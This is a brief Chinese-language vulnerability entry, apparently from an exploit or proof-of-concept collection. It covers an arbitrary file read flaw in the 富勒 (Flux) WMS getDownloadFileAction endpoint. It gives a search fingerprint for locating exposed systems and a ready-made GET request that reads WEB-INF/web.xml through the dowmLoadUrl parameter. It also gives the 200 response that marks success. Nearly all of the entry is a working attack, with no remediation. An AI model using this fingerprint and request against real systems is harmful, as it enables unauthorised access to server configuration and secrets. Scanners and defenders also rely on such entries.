# 富勒WMSgetDownloadFileAction存在任意文件读取漏洞

富勒 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/logincenterapp/ValidateImageService"`
- **请求**：`GET /a00webres/getDownloadFileAction?dowmLoadUrl=WEB-INF/web.xml&fileName=web.xml HTTP/1.1`
- **响应特征**：200